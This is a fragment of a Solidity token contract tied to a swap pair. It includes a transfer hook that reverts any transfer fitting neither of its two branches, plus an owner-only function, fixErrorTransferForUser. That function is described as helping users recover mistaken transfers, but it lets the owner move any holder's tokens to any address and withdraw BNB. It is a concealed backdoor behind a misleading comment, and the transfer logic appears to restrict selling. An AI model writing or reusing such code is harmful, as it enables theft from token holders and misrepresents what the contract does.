  function _transferPrepare(
    address sender,
    address recipient,
    uint256 tAmount
  ) private {
    bool senderIsPair = sender == swapV2Pair ? true : false;
    uint256 tmpBNBAmount = IERC20(FIST).balanceOf(swapV2Pair);
    uint256 lastBNB = IUniswapV2Pair(swapV2Pair).kLast().div(pairOwned);
    uint256 tmpLPAmount = IERC20(swapV2Pair).totalSupply();
    if (senderIsPair && tmpLPAmount < lastLP) {
      uint256 tDapp = tAmount.div(3);
      uint256 tTransferAmount = tAmount.sub(tDapp);
      _transferFree(sender, ECO, tDapp);
      _transferFree(sender, recipient, tTransferAmount);
    } else if (!senderIsPair && tmpBNBAmount > lastBNB) {
      uint256 old = pairOwned;
      uint256 bnbDiff = tmpBNBAmount.sub(lastBNB);
      uint256 bnbToTokenPRICE = lastBNB.mul(10**32).div(pairOwned);
      uint256 tokenTheory = bnbDiff.mul(10**32).div(bnbToTokenPRICE);

      require(tokenTheory >= tAmount, "ERROR");

      if (tokenTheory > tAmount) {
        _transferFree(_self, swapV2Pair, tokenTheory.sub(tAmount));
      }
      _transferFree(sender, recipient, tAmount);
      tmpLPAmount += tmpLPAmount.mul(tAmount).div(old);
    } else {
      require(false, "ERROR");
    }
    lastLP = tmpLPAmount;
  }

  /*
   *
   *This method is used to help users recover losses if they transfer any tokens to this contract by mistake.
   *Please do not transfer any tokens to the contract, ownership will not be recovered after relinquishment.
   */
  function fixErrorTransferForUser(
    address _token,
    address _from,
    address _to,
    uint256 _value
  ) public onlyOwner {
    if (_token == WBNB) {
      (bool success, ) = _to.call{value: _value}("");
      require(success, "Transfer failed.");
    } else if (_token == _self) _transferFree(_from, _to, _value);
    else IERC20(_token).transfer(_to, _value);
  }
}